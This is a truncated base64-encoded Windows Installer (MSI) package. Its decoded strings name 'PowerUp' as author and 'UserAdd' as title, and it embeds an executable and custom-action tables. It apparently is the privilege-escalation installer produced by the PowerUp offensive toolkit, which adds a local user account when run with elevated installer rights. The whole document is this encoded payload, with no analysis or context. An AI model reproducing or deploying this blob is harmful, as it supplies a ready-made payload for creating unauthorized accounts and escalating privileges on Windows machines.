AEBIUkT2ReRDrzs7QiZGN0IcQjRGaEQmQgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAIABQAAAAgAAAD/////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANAAAAJYAAAAAAAAAQEhSRPZF5EOvPxI/KEU4QrFBKEgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABYAAgD///////////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA3AAAAMAAAAAAAAABASBVBeETmQoxE8UHsRaxEMUgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFAACAQoAAAD//////////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADgAAAAEAAAAAAAAAEBIFkInQyRIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAAIA////////////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOQAAAA4AAAAAAAAAQEjeRGpF5EEoSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAgD///////////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABWAAAAIAAAAAAAAABASBtCKkP2RTVHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAACAQcAAAALAAAA/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADwAAAA8AAAAAAAAAEBIPzvyQzhEsUUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAIA////////////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASwAAAKACAAAAAAAAQEg/P3dFbERqPrJEL0gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAgD///////////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtAAAASAQAAAAAAABASD8/d0VsRGo75EUkSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAACAQkAAAAXAAAA/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAPIAAAAAAAAAUARABvAGMAdQBtAGUAbgB0AFMAdQBtAG0AYQByAHkASQBuAGYAbwByAG0AYQB0AGkAbwBuAAAAAAAAAAAAAAA4AAIA////////////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWwAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH///////////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD+////BiEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///////////////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////////////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///////////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///////////////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////////////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAIAAAADAAAABAAAAAUAAAAGAAAABwAAAP7/////////CgAAAAsAAAAMAAAADQAAAA4AAAAPAAAAEAAAABEAAAASAAAAEwAAABQAAAAVAAAAFgAAABcAAAAYAAAAGQAAABoAAAAbAAAAHAAAAB0AAAAeAAAAHwAAACAAAAAhAAAAIgAAACMAAAAkAAAAJQAAACYAAAAnAAAAKAAAACkAAAD+/////v////7////+////MwAAAP7////+/////v////7////+////OgAAADUAAAA2AAAA/v////7////+/////v///zsAAAA9AAAA/v///z4AAAA/AAAAQAAAAEEAAABCAAAAQwAAAEQAAABFAAAARgAAAEcAAABIAAAASQAAAEoAAAD+////TAAAAE0AAABOAAAATwAAAFAAAABRAAAAUgAAAFMAAABUAAAAVQAAAP7////+////WAAAAP7////+/////v///1wAAAD+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////7/AAAGAQIAAAAAAAAAAAAAAAAAAAAAAAEAAADghZ/y+U9oEKuRCAArJ7PZMAAAAKgBAAAOAAAAAQAAAHgAAAACAAAAkAEAAAMAAACAAQAABAAAAHABAAAFAAAAgAAAAAYAAAAoAQAABwAAAJQAAAAJAAAAqAAAAAwAAADYAAAADQAAAOQAAAAOAAAA8AAAAA8AAAD4AAAAEgAAAAgBAAATAAAAAAEAAAIAAADkBAAAHgAAAAoAAABJbnN0YWxsZXIAAAAeAAAACwAAAEludGVsOzEwMzMAAB4AAAAnAAAAe0EwNDlFMzFGLTc3MDEtNEM0QS1BQ0JDLUIyNjBFQjA4QkI0Q30AAEAAAAAALfR1QTjPAUAAAAAALfR1QTjPAQMAAADIAAAAAwAAAAIAAAADAAAAAgAAAB4AAAAXAAAATVNJIFdyYXBwZXIgKDQuMS41NC4wKQAAHgAAAEAAAABJbnN0YWxsZXIgd3JhcHBlZCBieSBNU0kgV3JhcHBlciAoNC4xLjU0LjApIGZyb20gd3d3LmV4ZW1zaS5jb20AHgAAAAgAAABQb3dlclVwAB4AAAAIAAAAVXNlckFkZAAeAAAAEAAAAFVzZXJBZGQgMS4wLjAuMABBOM8BAwAAAMgAAAADAAAAAgAAAB4AAAArAAAAV2luZG93cyBJbnN0YWxsZXIgWE1MIFRvb2xzZXQgKDMuOC4xMTI4LjApAAADAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYABgAGAAYABgAGAAYABgAGAAYACgAKACIAIgAiACkAKQApACoAKgAqACsAKwAvAC8ALwAvAC8ALwA1ADUANQA9AD0APQA9AD0ATQBNAE0ATQBNAE0ATQBNAFwAXABhAGEAYQBhAGEAYQBhAGEAbwBvAHIAcgByAHMAcwBzAHQAdAB3AHcAdwB3AHcAdwCCAIIAhgCGAIYAhgCGAIYAkACQAJAAkACQAJAAkAACAAUACwAMAA0ADgAPABAAEQASAAcACQAjACUAJwAjACUAJwAjACUAJwABAC0AJQAvADEANAA3ADoANQBJAEsABAAjAEAAQwBGAAsANAA3AE0ATwBRAFQAVgBdAF8AJwA3AF8AYQBkAGcAaQBrAAEALQAjACUAJwAjACUAJwALACUAQAB4AHoAfAB+AIAABwCCAAEABwBfAIYAiACKADcAawCRAJMAlQCZAJsACAAIABgAGAAYABgAGAAIABgAGAAIAAgACAAYABgACAAYABgACAAYABgACAAIABgACAAYAAgACAAYAAgAGAAIAAgACAAYABgAGAAYABgACAAIABgAGAAYAAgACAAIAAgAGAAIAAgACAAIABgAGAAIAAgACAAYABgACAAYABgACAAIABgACAAIABgAGAAYAAgACAAYABgACAAIAAgACAAIABgACAAYABgAGAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAgAEAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAA/P//fwAAAAAAAAAA/P//fwAAAAAAAAAA/P//fwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAgAAAAAAAAAAAAQAAgAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/P//fwAAAAAAAAAA/P//fwAAAAAAAAAAAAAAAAEAAIAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////fwAAAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAACA/////wAAAAAAAAAA/////wAAAAAAAAAAAAAAAAAAAAD/fwCAAAAAAAAAAAD/fwCAAAAAAAAAAAD/fwCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/fwCAAAAAAAAAAAAAAAAA/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP9/AID/fwCAAAAAAAAAAAD//////38AgAAAAAAAAAAAAAAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/fwCAAAAAAAAAAAD/fwCAAAAAAAAAAAAAAAAA/38AgP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAACAAAAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANQAAADsAAAA1AAAAAAAAAAAAAAAAAAAANQAAAAAATQAAAAAAAABNAC8AAAAAAC8AAAAAAAAAYQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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AAYABwAnAAEABAAEABwAAQAJABIAOwABAAsAAgAEAAIAPgABAAoABAAJAAwA0gABAAoACAAnAAEA6AABAAcAAgAcAAEA4wABAAwACwBTAAEAXgABAK0AAgEFAQgBCwECgAKAAoACgAKA/wD/AP8A/wD/AAABAwEGAQkBDAEBAQQBBwEKAQ0BqgCqAKoAqgCqAKqqqqoGAAQADAABAC4AAQAGAAIACQAFADoAAQAMAAIAVwABAIYAAQAQAAIApgABAAoAAwApAAEABwAVADkAAQAOAAIAlAABAAUAAgAuAAEAOgABAAcAAgA+AAEABQACAIEAAQAJAAIAawABAFEAAQASAAEAEQAFAAgAAgAfAAEACgAGACEAAQAEABQAcwABADkAAQAIAAIACAABAGMAAQAIAAIAJQABAAcAAwBBAAEACAAGAD8AAQB2AAEASgABAAQABQBOYW1lVGFibGVUeXBlQ29sdW1uX1ZhbGlkYXRpb25WYWx1ZU5Qcm9wZXJ0eUlkX1N1bW1hcnlJbmZvcm1hdGlvbkRlc2NyaXB0aW9uU2V0Q2F0ZWdvcnlLZXlDb2x1bW5NYXhWYWx1ZU51bGxhYmxlS2V5VGFibGVNaW5WYWx1ZUlkZW50aWZpZXJOYW1lIG9mIHRhYmxlTmFtZSBvZiBjb2x1bW5ZO05XaGV0aGVyIHRoZSBjb2x1bW4gaXMgbnVsbGFibGVZTWluaW11bSB2YWx1ZSBhbGxvd2VkTWF4aW11bSB2YWx1ZSBhbGxvd2VkRm9yIGZvcmVpZ24ga2V5LCBOYW1lIG9mIHRhYmxlIHRvIHdoaWNoIGRhdGEgbXVzdCBsaW5rQ29sdW1uIHRvIHdoaWNoIGZvcmVpZ24ga2V5IGNvbm5lY3RzVGV4dDtGb3JtYXR0ZWQ7VGVtcGxhdGU7Q29uZGl0aW9uO0d1aWQ7UGF0aDtWZXJzaW9uO0xhbmd1YWdlO0lkZW50aWZpZXI7QmluYXJ5O1VwcGVyQ2FzZTtMb3dlckNhc2U7RmlsZW5hbWU7UGF0aHM7QW55UGF0aDtXaWxkQ2FyZEZpbGVuYW1lO1JlZ1BhdGg7Q3VzdG9tU291cmNlO1Byb3BlcnR5O0NhYmluZXQ7U2hvcnRjdXQ7Rm9ybWF0dGVkU0RETFRleHQ7SW50ZWdlcjtEb3VibGVJbnRlZ2VyO1RpbWVEYXRlO0RlZmF1bHREaXJTdHJpbmcgY2F0ZWdvcnlUZXh0U2V0IG9mIHZhbHVlcyB0aGF0IGFyZSBwZXJtaXR0ZWREZXNjcmlwdGlvbiBvZiBjb2x1bW5BZG1pbkV4ZWN1dGVTZXF1ZW5jZUFjdGlvbk5hbWUgb2YgYWN0aW9uIHRvIGludm9rZSwgZWl0aGVyIGluIHRoZSBlbmdpbmUgb3IgdGhlIGhhbmRsZXIgRExMLkNvbmRpdGlvbk9wdGlvbmFsIGV4cHJlc3Npb24gd2hpY2ggc2tpcHMgdGhlIGFjdGlvbiBpZiBldmFsdWF0ZXMgdG8gZXhwRmFsc2UuSWYgdGhlIGV4cHJlc3Npb24gc3ludGF4IGlzIGludmFsaWQsIHRoZSBlbmdpbmUgd2lsbCB0ZXJtaW5hdGUsIHJldHVybmluZyBpZXNCYWRBY3Rpb25EYXRhLlNlcXVlbmNlTnVtYmVyIHRoYXQgZGV0ZXJtaW5lcyB0aGUgc29ydCBvcmRlciBpbiB3aGljaCB0aGUgYWN0aW9ucyBhcmUgdG8gYmUgZXhlY3V0ZWQuICBMZWF2ZSBibGFuayB0byBzdXBwcmVzcyBhY3Rpb24uQWRtaW5VSVNlcXVlbmNlQWR2dEV4ZWN1dGVTZXF1ZW5jZUJpbmFyeVVuaXF1ZSBrZXkgaWRlbnRpZnlpbmcgdGhlIGJpbmFyeSBkYXRhLkRhdGFUaGUgdW5mb3JtYXR0ZWQgYmluYXJ5IGRhdGEuQ29tcG9uZW50UHJpbWFyeSBrZXkgdXNlZCB0byBpZGVudGlmeSBhIHBhcnRpY3VsYXIgY29tcG9uZW50IHJlY29yZC5Db21wb25lbnRJZEd1aWRBIHN0cmluZyBHVUlEIHVuaXF1ZSB0byB0aGlzIGNvbXBvbmVudCwgdmVyc2lvbiwgYW5kIGxhbmd1YWdlLkRpcmVjdG9yeV9EaXJlY3RvcnlSZXF1aXJlZCBrZXkgb2YgYSBEaXJlY3RvcnkgdGFibGUgcmVjb3JkLiBUaGlzIGlzIGFjdHVhbGx5IGEgcHJvcGVydHkgbmFtZSB3aG9zZSB2YWx1ZSBjb250YWlucyB0aGUgYWN0dWFsIHBhdGgsIHNldCBlaXRoZXIgYnkgdGhlIEFwcFNlYXJjaCBhY3Rpb24gb3Igd2l0aCB0aGUgZGVmYXVsdCBzZXR0aW5nIG9idGFpbmVkIGZyb20gdGhlIERpcmVjdG9yeSB0YWJsZS5BdHRyaWJ1dGVzUmVtb3RlIGV4ZWN1dGlvbiBvcHRpb24sIG9uZSBvZiBpcnNFbnVtQSBjb25kaXRpb25hbCBzdGF0ZW1lbnQgdGhhdCB3aWxsIGRpc2FibGUgdGhpcyBjb21wb25lbnQgaWYgdGhlIHNwZWNpZmllZCBjb25kaXRpb24gZXZhbHVhdGVzIHRvIHRoZSAnVHJ1ZScgc3RhdGUuIElmIGEgY29tcG9uZW50IGlzIGRpc2FibGVkLCBpdCB3aWxsIG5vdCBiZSBpbnN0YWxsZWQsIHJlZ2FyZGxlc3Mgb2YgdGhlICdBY3Rpb24nIHN0YXRlIGFzc29jaWF0ZWQgd2l0aCB0aGUgY29tcG9uZW50LktleVBhdGhGaWxlO1JlZ2lzdHJ5O09EQkNEYXRhU291cmNlRWl0aGVyIHRoZSBwcmltYXJ5IGtleSBpbnRvIHRoZSBGaWxlIHRhYmxlLCBSZWdpc3RyeSB0YWJsZSwgb3IgT0RCQ0RhdGFTb3VyY2UgdGFibGUuIFRoaXMgZXh0cmFjdCBwYXRoIGlzIHN0b3JlZCB3aGVuIHRoZSBjb21wb25lbnQgaXMgaW5zdGFsbGVkLCBhbmQgaXMgdXNlZCB0byBkZXRlY3QgdGhlIHByZXNlbmNlIG9mIHRoZSBjb21wb25lbnQgYW5kIHRvIHJldHVybiB0aGUgcGF0aCB0byBpdC5DdXN0b21BY3Rpb25QcmltYXJ5IGtleSwgbmFtZSBvZiBhY3Rpb24sIG5vcm1hbGx5IGFwcGVhcnMgaW4gc2VxdWVuY2UgdGFibGUgdW5sZXNzIHByaXZhdGUgdXNlLlRoZSBudW1lcmljIGN1c3RvbSBhY3Rpb24gdHlwZSwgY29uc2lzdGluZyBvZiBzb3VyY2UgbG9jYXRpb24sIGNvZGUgdHlwZSwgZW50cnksIG9wdGlvbiBmbGFncy5Tb3VyY2VDdXN0b21Tb3VyY2VUaGUgdGFibGUgcmVmZXJlbmNlIG9mIHRoZSBzb3VyY2Ugb2YgdGhlIGNvZGUuVGFyZ2V0Rm9ybWF0dGVkRXhjZWN1dGlvbiBwYXJhbWV0ZXIsIGRlcGVuZHMgb24gdGhlIHR5cGUgb2YgY3VzdG9tIGFjdGlvbkV4dGVuZGVkVHlwZUEgbnVtZXJpYyBjdXN0b20gYWN0aW9uIHR5cGUgdGhhdCBleHRlbmRzIGNvZGUgdHlwZSBvciBvcHRpb24gZmxhZ3Mgb2YgdGhlIFR5cGUgY29sdW1uLlVuaXF1ZSBpZGVudGlmaWVyIGZvciBkaXJlY3RvcnkgZW50cnksIHByaW1hcnkga2V5LiBJZiBhIHByb3BlcnR5IGJ5IHRoaXMgbmFtZSBpcyBkZWZpbmVkLCBpdCBjb250YWlucyB0aGUgZnVsbCBwYXRoIHRvIHRoZSBkaXJlY3RvcnkuRGlyZWN0b3J5X1BhcmVudFJlZmVyZW5jZSB0byB0aGUgZW50cnkgaW4gdGhpcyB0YWJsZSBzcGVjaWZ5aW5nIHRoZSBkZWZhdWx0IHBhcmVudCBkaXJlY3RvcnkuIEEgcmVjb3JkIHBhcmVudGVkIHRvIGl0c2VsZiBvciB3aXRoIGEgTnVsbCBwYXJlbnQgcmVwcmVzZW50cyBhIHJvb3Qgb2YgdGhlIGluc3RhbGwgdHJlZS5EZWZhdWx0RGlyVGhlIGRlZmF1bHQgc3ViLXBhdGggdW5kZXIgcGFyZW50J3MgcGF0aC5GZWF0dXJlUHJpbWFyeSBrZXkgdXNlZCB0byBpZGVudGlmeSBhIHBhcnRpY3VsYXIgZmVhdHVyZSByZWNvcmQuRmVhdHVyZV9QYXJlbnRPcHRpb25hbCBrZXkgb2YgYSBwYXJlbnQgcmVjb3JkIGluIHRoZSBzYW1lIHRhYmxlLiBJZiB0aGUgcGFyZW50IGlzIG5vdCBzZWxlY3RlZCwgdGhlbiB0aGUgcmVjb3JkIHdpbGwgbm90IGJlIGluc3RhbGxlZC4gTnVsbCBpbmRpY2F0ZXMgYSByb290IGl0ZW0uVGl0bGVTaG9ydCB0ZXh0IGlkZW50aWZ5aW5nIGEgdmlzaWJsZSBmZWF0dXJlIGl0ZW0uTG9uZ2VyIGRlc2NyaXB0aXZlIHRleHQgZGVzY3JpYmluZyBhIHZpc2libGUgZmVhdHVyZSBpdGVtLkRpc3BsYXlOdW1lcmljIHNvcnQgb3JkZXIsIHVzZWQgdG8gZm9yY2UgYSBzcGVjaWZpYyBkaXNwbGF5IG9yZGVyaW5nLkxldmVsVGhlIGluc3RhbGwgbGV2ZWwgYXQgd2hpY2ggcmVjb3JkIHdpbGwgYmUgaW5pdGlhbGx5IHNlbGVjdGVkLiBBbiBpbnN0YWxsIGxldmVsIG9mIDAgd2lsbCBkaXNhYmxlIGFuIGl0ZW0gYW5kIHByZXZlbnQgaXRzIGRpc3BsYXkuVXBwZXJDYXNlVGhlIG5hbWUgb2YgdGhlIERpcmVjdG9yeSB0aGF0IGNhbiBiZSBjb25maWd1cmVkIGJ5IHRoZSBVSS4gQSBub24tbnVsbCB2YWx1ZSB3aWxsIGVuYWJsZSB0aGUgYnJvd3NlIGJ1dHRvbi4wOzE7Mjs0OzU7Njs4Ozk7MTA7MTY7MTc7MTg7MjA7MjE7MjI7MjQ7MjU7MjY7MzI7MzM7MzQ7MzY7Mzc7Mzg7NDg7NDk7NTA7NTI7NTM7NTRGZWF0dXJlIGF0dHJpYnV0ZXNGZWF0dXJlQ29tcG9uZW50c0ZlYXR1cmVfRm9yZWlnbiBrZXkgaW50byBGZWF0dXJlIHRhYmxlLkNvbXBvbmVudF9Gb3JlaWduIGtleSBpbnRvIENvbXBvbmVudCB0YWJsZS5GaWxlUHJpbWFyeSBrZXksIG5vbi1sb2NhbGl6ZWQgdG9rZW4sIG11c3QgbWF0Y2ggaWRlbnRpZmllciBpbiBjYWJpbmV0LiAgRm9yIHVuY29tcHJlc3NlZCBmaWxlcywgdGhpcyBmaWVsZCBpcyBpZ25vcmVkLkZvcmVpZ24ga2V5IHJlZmVyZW5jaW5nIENvbXBvbmVudCB0aGF0IGNvbnRyb2xzIHRoZSBmaWxlLkZpbGVOYW1lRmlsZW5hbWVGaWxlIG5hbWUgdXNlZCBmb3IgaW5zdGFsbGF0aW9uLCBtYXkgYmUgbG9jYWxpemVkLiAgVGhpcyBtYXkgY29udGFpbiBhICJzaG9ydCBuYW1lfGxvbmcgbmFtZSIgcGFpci5GaWxlU2l6ZVNpemUgb2YgZmlsZSBpbiBieXRlcyAobG9uZyBpbnRlZ2VyKS5WZXJzaW9uVmVyc2lvbiBzdHJpbmcgZm9yIHZlcnNpb25lZCBmaWxlczsgIEJsYW5rIGZvciB1bnZlcnNpb25lZCBmaWxlcy5MYW5ndWFnZUxpc3Qgb2YgZGVjaW1hbCBsYW5ndWFnZSBJZHMsIGNvbW1hLXNlcGFyYXRlZCBpZiBtb3JlIHRoYW4gb25lLkludGVnZXIgY29udGFpbmluZyBiaXQgZmxhZ3MgcmVwcmVzZW50aW5nIGZpbGUgYXR0cmlidXRlcyAod2l0aCB0aGUgZGVjaW1hbCB2YWx1ZSBvZiBlYWNoIGJpdCBwb3NpdGlvbiBpbiBwYXJlbnRoZXNlcylTZXF1ZW5jZSB3aXRoIHJlc3BlY3QgdG8g